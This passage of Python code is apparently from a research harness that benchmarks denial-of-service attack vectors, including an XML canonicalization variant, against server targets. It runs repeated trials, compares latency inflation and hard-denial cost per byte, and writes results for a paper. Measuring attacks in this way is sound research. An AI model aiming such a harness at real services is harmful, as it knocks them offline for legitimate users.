            calib = dict(probe_vector=None, probe_size=None, floor=0.0, mu_served=None, gateable=False)
            if a.work_probe:
                dp = ftargets.get(target, {})
                if dp.get("probe_size"):
                    # target declares a hand-tuned work-probe in fire.py -> use it verbatim.
                    # Measure its idle served latency once (for the comparable lat_x baseline).
                    pv = dp.get("probe_vector", dp.get("vector"))
                    ps, fl = dp["probe_size"], dp.get("probe_floor", 0.0)
                    med, _, _, _ = _probe_dist(target, pv, ps, a.outdir)
                    calib = dict(probe_vector=pv, probe_size=ps, floor=fl, mu_served=med,
                                 gateable=bool(fl), source="declared")
                    log(f"  calib[{target}] declared work-probe {pv}@{ps} "
                        f"floor={fl}s (idle served={med}s)")
                else:
                    calib = calibrate_target(target, a.box, a.outdir, vmap, a.recalibrate)
            psz = calib.get("probe_size")
            pvec = calib.get("probe_vector") if psz else None
            pfloor = calib.get("floor") if psz else None

            # 2) idle control -- attack-independent; measured ONCE per target and shared as the
            #    latency baseline for every vector's record below.
            idle_json = os.path.join(a.outdir, f"{target}.idle.json")
            idle = fire(target, mi, a.duration, idle_json, probe_only=a.idle)
            idle_rec = None
            if idle:
                ph = idle.get("probes", {}).get("sustain", {})
                idle_rec = dict(n=ph.get("n"), failed=ph.get("failed"),
                                avg_served_s=ph.get("avg_served_s"))

            # 3) sweep the attack matrix: each (vector, size) spec gets its own N trials and its own
            #    result row, keyed "<target> [<vector>]".
            for vector, size in specs:
                key = f"{target} [{vector}]"
                rec = dict(stack=stack, target=target, vector=vector, size=size, pool=pool,
                           max_inflight=mi, box=a.box, duration=a.duration)
                if idle_rec is not None:
                    rec["idle"] = idle_rec
                if a.work_probe:
                    rec["probe"] = dict(vector=pvec, size=psz, floor=pfloor,
                                        cal_served_s=(calib.get("mu_served") if psz else None),
                                        gateable=calib.get("gateable"))
                log(f"  -- {target} vector={vector} size={size} "
                    f"(work-probe {pvec}@{psz} floor={pfloor}s)" if psz else
                    f"  -- {target} vector={vector} size={size} (minimal probe)")

                # primary run (for the cianide spec this is the inclusive C14N variant)
                trials = _run_trials(target, stack, a, mi, vector, vector, size, psz, pvec, pfloor)
                m = _aggregate(trials)
                variant = None

                # C14N failover: inclusive C14N (c14n-inc) reached no HARD denial here -> also fire the
                # exclusive variant and keep whichever is stronger. inc/exc is a modifier of C14N1D3, not
                # a separate vector, so this simply reports the stronger modifier per product. Triggers on
                # ratio==0 (no hard denial) -- which also covers the inert case -- so it catches targets
                # where inc burns CPU but never denies (e.g. synapse), not just where inc is wholly inert.
                if vector == "cianide" and a.c14n_failover and not ((m.get("ratio_mean") or 0.0) > 0.0):
                    log(f"  c14n-inc reached no hard denial on {target}; failing over to c14n-exc")
                    trials_exc = _run_trials(target, stack, a, mi, "cianide-exc", "c14n-exc",
                                             a.c14n_exc_size, psz, pvec, pfloor)
                    m_exc = _aggregate(trials_exc)
                    if _stronger(m_exc, m):
                        m, trials, variant = m_exc, trials_exc, "exc"
                        rec["size"] = a.c14n_exc_size   # exc won -> report the size actually used
                        log(f"     -> c14n-exc @{a.c14n_exc_size} stronger (ratio={m.get('ratio_mean')}); using exclusive")
                    else:
                        variant = "inc"
                        log(f"     -> c14n-inc kept (c14n-exc no stronger)")

                rec.update(m)
                if vector == "cianide":
                    rec["c14n_variant"] = variant or "inc"
                # Latency lens vs the comparable (work-probe) idle baseline: a DoS can be pure slowdown
                # with no hard failure (Synapse), which unavailable_s scores as zero.
                if rec.get("attack_lat_s"):
                    base = rec.get("probe", {}).get("cal_served_s") or rec.get("idle", {}).get("avg_served_s")
                    if base:
                        rec["latency_inflation"] = rec["attack_lat_s"] / base
                results[key] = rec

        # bring this stack down (unless it's the last and --keep-up)
        if not (a.keep_up and si == len(stacks) - 1):
            stack_down(stack)

    # ---- write aggregate + print the comparable table ----
    agg_path = os.path.join(a.outdir, "harness_results.json")
    with open(agg_path, "w") as f:
        json.dump(dict(box=a.box, duration=a.duration, repeats=a.repeats, results=results), f, indent=2)
    log(f"aggregate -> {agg_path}")

    print("\n=== COMPARABLE RESULTS (fixed box SIZE=%s, %gs x %d trials) ===" % (a.box, a.duration, a.repeats))
    print("Availability = unavailable_s / bytes_sent (hard denial; higher = cheaper DoS).  "
          "lat_x = attack/idle legit-probe latency")
    print("(slowdown DoS; a target can fail EITHER lens -- a saturated-but-not-exhausted pool slows "
          "legit requests without ever forming a hard-denial window; a single-threaded server instead "
          "blacks out entirely, which shows as hard denial).")
    print(f"{'target[vector]':<28} {'pool':>4} {'mi':>4} {'size':>7} {'n':>3} {'ratio_mean(s/B)':>16} {'ratio_sd':>10} "
          f"{'idle_lat':>9} {'atk_lat':>9} {'lat_x':>7} {'fail/n':>7} {'flags':>7}")
    # sort by mean ratio descending (most efficient hard-denial DoS first; lat_x column still shows
    # slowdown DoS for targets whose ratio is ~0)
    def keyf(kv):
        return kv[1].get("ratio_mean", -1)
    for key, rec in sorted(results.items(), key=keyf, reverse=True):
        if "error" in rec:
            print(f"{key:<28}   ERROR: {rec['error']}")
            continue
        rm = rec.get("ratio_mean"); sd = rec.get("ratio_stdev")
        idle = rec.get("idle", {})
        # when the work-doing probe was used, the comparable idle baseline is its calibrated
        # served latency, not the minimal probe's.
        il = rec.get("probe", {}).get("cal_served_s") or idle.get("avg_served_s")
        al = rec.get("attack_lat_s"); lx = rec.get("latency_inflation")
        mi = rec.get("max_inflight")
        rm_cell = f"{rm:.3e}" if rm is not None else "n/a"
        sd_cell = f"{sd:.2e}" if sd is not None else "n/a"
        il_cell = f"{il:.2f}s" if il is not None else "n/a"
        al_cell = f"{al:.2f}s" if al is not None else "n/a"
        lx_cell = f"{lx:.0f}x" if lx is not None else "n/a"
        mi_cell = str(mi) if mi is not None else "n/a"
        fail_cell = (f"{idle.get('failed')}/{idle.get('n')}") if idle else "n/a"
        _bits = ([] if not rec.get("probe", {}).get("floor") else ["gated"])
        if rec.get("c14n_variant"):
            _bits.append(rec["c14n_variant"])          # inc / exc actually used for the C14N1D3 row
        flags = "INERT" if rec.get("inert") else "/".join(_bits)
        print(f"{key:<28} {rec['pool']:>4} {mi_cell:>4} {str(rec.get('size','')):>7} {rec.get('trials',0):>3} "
              f"{rm_cell:>16} {sd_cell:>10} {il_cell:>9} {al_cell:>9} {lx_cell:>7} {fail_cell:>7} {flags:>7}")
    # also emit CSV for the paper's plotting
    csv_path = os.path.join(a.outdir, "harness_results.csv")
    with open(csv_path, "w") as f:
        f.write("target,vector,stack,pool,max_inflight,size,trials,ratio_mean_s_per_byte,ratio_median,"
                "ratio_stdev,unavail_s_mean,bytes_sent_mean,idle_avg_served_s,attack_lat_s,"
                "latency_inflation,idle_failed,idle_n,inert,probe_floor_s,c14n_variant\n")
        for key, rec in results.items():
            if "error" in rec:
                f.write(f"{key},,{rec.get('stack','')}" + "," * 17 + "\n"); continue
            idle = rec.get("idle", {})
            f.write(f"{rec.get('target', key)},{rec.get('vector','')},{rec['stack']},{rec['pool']},"
                    f"{rec.get('max_inflight','')},{rec.get('size','')},{rec.get('trials',0)},"
                    f"{rec.get('ratio_mean','')},{rec.get('ratio_median','')},{rec.get('ratio_stdev','')},"
                    f"{rec.get('unavail_s_mean','')},{rec.get('bytes_sent_mean','')},"
                    f"{idle.get('avg_served_s','')},{rec.get('attack_lat_s','')},{rec.get('latency_inflation','')},"
                    f"{idle.get('failed','')},{idle.get('n','')},{int(rec.get('inert', False))},"
                    f"{rec.get('probe', {}).get('floor', '')},{rec.get('c14n_variant', '')}\n")
    log(f"csv -> {csv_path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
